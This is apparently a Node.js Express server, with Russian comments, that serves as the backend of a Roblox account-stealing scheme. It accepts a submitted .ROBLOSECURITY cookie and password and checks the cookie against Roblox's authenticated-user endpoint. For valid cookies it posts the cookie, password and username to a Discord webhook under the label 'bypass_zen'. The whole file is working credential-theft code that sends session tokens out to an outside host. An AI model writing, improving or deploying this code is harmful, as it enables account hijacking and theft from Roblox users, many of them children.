const express = require('express');
const app = express();

app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.get('/ping', (req, res) => res.send('OK'));

app.post('/api/submit', async (req, res) => {
  console.log("[REQUEST] Received:", JSON.stringify(req.body).slice(0, 200));
  
  const { cookie, password, category, webhookUrl } = req.body;

  if (!cookie || !password) {
    return res.status(400).json({ isValid: false, reason: "Missing fields" });
  }

  // Очистка куки
  let cleaned = cookie.trim();
  if (cleaned.startsWith("_|WARNING")) {
    const parts = cleaned.split("|_");
    if (parts.length >= 2) cleaned = parts[parts.length - 1].trim();
  }
  cleaned = cleaned.replace(/^["';]+|["';]+$/g, "").trim();

  try {
    // Запрос к API Roblox
    const robloxRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Cookie': `.ROBLOSECURITY=${cleaned}`
      }
    });

    console.log("[ROBLOX] Status:", robloxRes.status);

    // НЕВАЛИДНАЯ КУКА - НЕ ОТПРАВЛЯЕМ В DISCORD
    if (robloxRes.status !== 200) {
      const reason = robloxRes.status === 401 ? "Invalid cookie" : `Roblox HTTP ${robloxRes.status}`;
      console.log("[SKIP] Not sending invalid cookie to Discord");
      return res.status(400).json({ isValid: false, reason });
    }

    const userData = await robloxRes.json();
    console.log("[ROBLOX] User:", userData.name);
    
    if (!userData || !userData.id) {
      console.log("[SKIP] No user ID, not sending to Discord");
      return res.status(400).json({ isValid: false, reason: "Failed to parse Roblox user" });
    }

    // ВАЛИДНАЯ КУКА - ОТПРАВЛЯЕМ В DISCORD
    if (webhookUrl) {
      const safeBlock = text => "```\n" + String(text).replace(/`/g, "'") + "\n```";
      const payload = {
        username: "bypass_zen",
        embeds: [{
          title: "✅ Valid Cookie",
          color: 0x2ecc71,
          description:
            `**🗂 Category:** ${category}\n` +
            `**👤 User:** ${userData.name || "Unknown"} (ID: ${userData.id})\n\n` +
            `**📝 Cookie**\n${safeBlock(cookie)}` +
            `\n**🔑 Password**\n${safeBlock(password)}`,
          footer: { text: "bypass_zen · 2026" },
          timestamp: new Date().toISOString()
        }]
      };

      try {
        const discordRes = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        console.log("[DISCORD] Status:", discordRes.status);
      } catch (e) {
        console.log("[DISCORD] Error:", e.message);
      }
    }

    return res.json({
      isValid: true,
      userId: userData.id,
      username: userData.name || "Unknown"
    });

  } catch (err) {
    console.log("[ERROR]", err.message);
    return res.status(500).json({ isValid: false, reason: "Server error: " + err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
